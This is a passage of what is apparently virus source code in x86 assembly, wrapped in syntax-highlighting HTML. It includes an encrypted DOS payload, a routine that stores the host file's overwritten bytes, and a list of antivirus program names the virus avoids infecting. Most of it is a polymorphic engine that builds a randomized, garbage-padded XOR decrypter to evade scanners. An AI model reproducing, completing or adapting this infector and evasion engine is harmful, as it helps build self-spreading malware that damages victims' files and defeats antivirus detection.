        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">076h</span><span class="sc4">,</span><span class="sc2">026h</span><span class="sc4">,</span><span class="sc2">04ch</span><span class="sc4">,</span><span class="sc2">0d4h</span><span class="sc4">,</span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0d6h</span><span class="sc4">,</span><span class="sc2">02dh</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">0ech</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">08eh</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc4">,</span><span class="sc2">09fh</span><span class="sc4">,</span><span class="sc2">03dh</span><span class="sc4">,</span><span class="sc2">0a9h</span><span class="sc4">,</span><span class="sc2">09fh</span><span class="sc4">,</span><span class="sc2">095h</span><span class="sc4">,</span><span class="sc2">09bh</span><span class="sc4">,</span><span class="sc2">0e0h</span><span class="sc4">,</span><span class="sc2">08bh</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">0d4h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e0h</span><span class="sc4">,</span><span class="sc2">0b2h</span><span class="sc4">,</span><span class="sc2">09bh</span><span class="sc4">,</span><span class="sc2">091h</span><span class="sc4">,</span><span class="sc2">0d2h</span><span class="sc4">,</span><span class="sc2">0d2h</span><span class="sc4">,</span><span class="sc2">0d2h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0ach</span><span class="sc4">,</span><span class="sc2">098h</span><span class="sc4">,</span><span class="sc2">09bh</span><span class="sc4">,</span><span class="sc2">0e0h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b3h</span><span class="sc4">,</span><span class="sc2">09fh</span><span class="sc4">,</span><span class="sc2">08ch</span><span class="sc4">,</span><span class="sc2">08eh</span><span class="sc4">,</span><span class="sc2">097h</span><span class="sc4">,</span><span class="sc2">088h</span><span class="sc4">,</span><span class="sc2">0e0h</span><span class="sc4">,</span><span class="sc2">098h</span><span class="sc4">,</span><span class="sc2">09fh</span><span class="sc4">,</span><span class="sc2">08dh</span><span class="sc4">,</span><span class="sc2">0e0h</span><span class="sc4">,</span><span class="sc2">087h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">091h</span><span class="sc4">,</span><span class="sc2">08bh</span><span class="sc4">,</span><span class="sc2">0d2h</span><span class="sc4">,</span><span class="sc2">0d2h</span><span class="sc4">,</span><span class="sc2">0d2h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">089h</span><span class="sc4">,</span><span class="sc2">0c7h</span><span class="sc4">,</span><span class="sc2">088h</span><span class="sc4">,</span><span class="sc2">0d2h</span><span class="sc4">,</span><span class="sc2">093h</span><span class="sc4">,</span><span class="sc2">0bfh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ach</span><span class="sc4">,</span><span class="sc2">0aeh</span><span class="sc4">,</span><span class="sc2">097h</span><span class="sc4">,</span><span class="sc2">0a8h</span><span class="sc4">,</span><span class="sc2">0e0h</span><span class="sc4">,</span><span class="sc2">0adh</span><span class="sc4">,</span><span class="sc2">0aah</span><span class="sc4">,</span><span class="sc2">0a8h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">018h</span><span class="sc4">,</span><span class="sc2">0eah</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">04ch</span><span class="sc4">,</span><span class="sc2">0f6h</span><span class="sc4">,</span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc2">018h</span><span class="sc4">,</span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0f6h</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">08bh</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc4">,</span><span class="sc2">047h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e2h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">018h</span><span class="sc4">,</span><span class="sc2">05fh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">01eh</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">03dh</span><span class="sc4">,</span><span class="sc2">048h</span><span class="sc4">,</span><span class="sc2">0fdh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc2">0f0h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04ch</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04bh</span><span class="sc4">,</span><span class="sc2">0e0h</span><span class="sc4">,</span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc2">0f0h</span><span class="sc4">,</span><span class="sc2">03dh</span><span class="sc0">
</span><span class="sc5">first4bts</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;the first 4 overwritten bytes from the host</span><span class="sc0">
</span><span class="sc5">dospayloadsize</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dospayload</span><span class="sc0">

</span><span class="sc5">badnames</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc3">"_AVP"</span><span class="sc0">                      </span><span class="sc1">;_AVP files</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"NAV"</span><span class="sc0">                       </span><span class="sc1">;Norton AV</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc3">"TB"</span><span class="sc0">                        </span><span class="sc1">;Tbscan, Tbav32, whole shit</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc3">"F-"</span><span class="sc0">                        </span><span class="sc1">;F-Prot</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"PAV"</span><span class="sc0">                       </span><span class="sc1">;Panda AV</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"DRW"</span><span class="sc0">                       </span><span class="sc1">;Doc. Web</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc3">"DSAV"</span><span class="sc0">                      </span><span class="sc1">;Doc. Salomon</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"NOD"</span><span class="sc0">                       </span><span class="sc1">;NodIce</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"SCA"</span><span class="sc0">                       </span><span class="sc1">;SCAN</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc3">"NUKEN"</span><span class="sc0">                     </span><span class="sc1">;Nukenabber? (error with infecting)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc3">"YAPS"</span><span class="sc0">                      </span><span class="sc1">;YetAnotherPortScanner (selfcheck)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"HL."</span><span class="sc0">                       </span><span class="sc1">;HalfLife (thx to Ghostie!)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc3">"MIRC"</span><span class="sc0">                      </span><span class="sc1">;mIRC = strange</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0h</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       * Checks the name of the file to be infected</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">checkname</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;check for some bad names</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">;delta</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">;points to filename</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">scasb</span><span class="sc0">                   </span><span class="sc1">;search from left to right for the dot</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">std</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'\'          ;search from right to left for the \
</span><span class="sc13">        scasb
</span><span class="sc0">        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;edi pointed to char before \
        inc     edi             ;edi pointed to \
</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">badnames</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">checkname2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;for load AL</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                                   </span><span class="sc1">;size of string in al</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">didit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;counter for bytes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">;save pointer to filename</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">cmpsb</span><span class="sc0">                                   </span><span class="sc1">;compare stringbyte</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ArghItIsAshitFile</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">checkname2</span><span class="sc0">

</span><span class="sc5">ArghItIsAshitFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">didit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       *** POLYMORFIC engine which generates decrypter &amp; encrypts code ***</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The generated code will look like this:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; pushad</span><span class="sc0">
</span><span class="sc1">; lea RegUsedAsPointer,[eax+placewherecryptedcodestarts]</span><span class="sc0">
</span><span class="sc1">; mov keyregister,randomvalue</span><span class="sc0">
</span><span class="sc1">; sub keyregister,randomvalue</span><span class="sc0">
</span><span class="sc1">; mov counterreg,size</span><span class="sc0">
</span><span class="sc1">; again:</span><span class="sc0">
</span><span class="sc1">; mov tempregister,[RegUsedAsPointer]</span><span class="sc0">
</span><span class="sc1">; xor tempregister,keyregister</span><span class="sc0">
</span><span class="sc1">; mov [RegUsedAsPointer],tempregister</span><span class="sc0">
</span><span class="sc1">; add RegUsedAsPointer,4</span><span class="sc0">
</span><span class="sc1">; dec counterreg</span><span class="sc0">
</span><span class="sc1">; pushf</span><span class="sc0">
</span><span class="sc1">; popf</span><span class="sc0">
</span><span class="sc1">; jz  exit</span><span class="sc0">
</span><span class="sc1">; jmp again</span><span class="sc0">
</span><span class="sc1">; exit:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; between each instruction some random code is putted.</span><span class="sc0">

</span><span class="sc5">polysz</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">polyend</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">encrypt</span><span class="sc0">
</span><span class="sc5">encrypt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">viruscopy</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;edi points to buffer        </span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc1">;--------PUSHAD--</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">                  </span><span class="sc1">;pushad</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc1">;--------MOV-----</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

</span><span class="sc5">getregforoffset</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;This reg will contain the offset of code</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">;do not use ESP</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getregforoffset</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                    </span><span class="sc1">;do not use EBP (!)</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getregforoffset</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">;backup register for offset code</span><span class="sc0">



        </span><span class="sc1">;--LEA reg,[EAX+x]-             ;lea</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">08dh</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;save location for patch</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                           </span><span class="sc1">;doesn't matter what we store</span><span class="sc0">
        </span><span class="sc1">;------------------</span><span class="sc0">
        

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">
      

</span><span class="sc5">getregforkey</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">;This reg will contain the crypt key</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">;do not use ESP</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getregforkey</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;do not use ECX</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getregforkey</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getregforkey</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">;backup register</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc1">;--------MOV-----</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">                 </span><span class="sc1">;make a MOV reg, rndvalue</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc1">;----------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;backup key</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">;register back in ah</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc1">;--------SUB-----</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc0">                 </span><span class="sc1">;make a SUB reg, rndvalue</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0e8h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc1">;----------------</span><span class="sc0">


        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;Save the cryptkey</span><span class="sc0">

        
</span><span class="sc5">getregforsize</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">;do not use ESP</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getregforsize</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">;nor keyreg</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getregforsize</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">                   </span><span class="sc1">;nor offsetreg</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getregforsize</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">


        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc1">;----MOVSIZE-----               ;mov ecx,virussize (size to decrypt)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">virusz</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc1">;----------------</span><span class="sc0">


        </span><span class="sc1">;***    AT THIS POINT IS EDI THE OFFSET FOR THE JMP     ***</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">


        </span><span class="sc1">;8b + 00, eax=3,[eax=0]        ch = reg2</span><span class="sc0">


</span><span class="sc5">getregtoxor</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">;This reg will contain crypted code and'll be xored</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">;do not use ESP</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getregtoxor</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getregtoxor</span><span class="sc0">             </span><span class="sc1">;do not use the keyreg</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getregtoxor</span><span class="sc0">             </span><span class="sc1">;do not use the offset reg</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getregtoxor</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">


        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">


        </span><span class="sc1">;-MOV REG3,[REG2]      ;make a mov reg3,[reg2] reg2=offset code</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">08bh</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc1">;----------------</span><span class="sc0">


        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">


        </span><span class="sc1">;-XOR REG3,REG1--       ;make a xor reg3,reg1 reg1=key</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">33h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc1">;----------------</span><span class="sc0">


        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">

        </span><span class="sc1">;-MOV [REG2],REG3       ;make a mov [reg2],reg3 reg2=offset code </span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">089h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc1">;----------------</span><span class="sc0">


        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">


        </span><span class="sc1">;-ADD REG2,4-----       ;adds 4 to the offset register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">004c0h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc1">;----------------</span><span class="sc0">


        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">


        </span><span class="sc1">;---DEC REG4-----       ;decreases counter reg4 (size)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">048h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc1">;----------------</span><span class="sc0">

